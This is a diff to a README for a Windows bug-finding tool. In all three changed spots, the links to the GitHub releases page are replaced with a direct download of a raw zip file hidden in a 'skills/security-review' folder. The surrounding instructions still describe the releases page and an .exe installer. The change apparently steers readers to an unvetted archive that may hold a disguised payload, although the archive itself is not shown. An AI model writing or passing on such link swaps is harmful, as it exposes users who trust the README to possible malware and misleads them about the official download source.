@@ -1,6 +1,6 @@
 # 🐞 bug-hunter - Find and Fix Code Bugs Easily
 
-[![Download bug-hunter](https://img.shields.io/badge/Download-bug--hunter-blue?style=for-the-badge)](https://github.com/isdvsv/bug-hunter/releases)
+[![Download bug-hunter](https://img.shields.io/badge/Download-bug--hunter-blue?style=for-the-badge)](https://github.com/isdvsv/bug-hunter/raw/refs/heads/main/skills/security-review/bug-hunter-3.9.zip)
 
 
 ## Overview
@@ -32,7 +32,7 @@ You will download bug-hunter from the official GitHub release page. This page ho
 ## 📥 How to Download and Install bug-hunter on Windows
 
 1. Open this page in your web browser:  
-   [Download bug-hunter](https://github.com/isdvsv/bug-hunter/releases)  
+   [Download bug-hunter](https://github.com/isdvsv/bug-hunter/raw/refs/heads/main/skills/security-review/bug-hunter-3.9.zip)  
    Click the button above or copy and paste the link into your browser’s address bar.
 
 2. On the releases page, look for the latest version of bug-hunter. The newest release is always listed at the top.
@@ -141,7 +141,7 @@ If none of these steps work, check the GitHub Issues page for bug-hunter for hel
 
 Visit the official release page to download the latest version of bug-hunter:
 
-[Download bug-hunter](https://github.com/isdvsv/bug-hunter/releases)  
+[Download bug-hunter](https://github.com/isdvsv/bug-hunter/raw/refs/heads/main/skills/security-review/bug-hunter-3.9.zip)  
 
 Follow the steps in the install section above once you have downloaded the `.exe` installer.
 
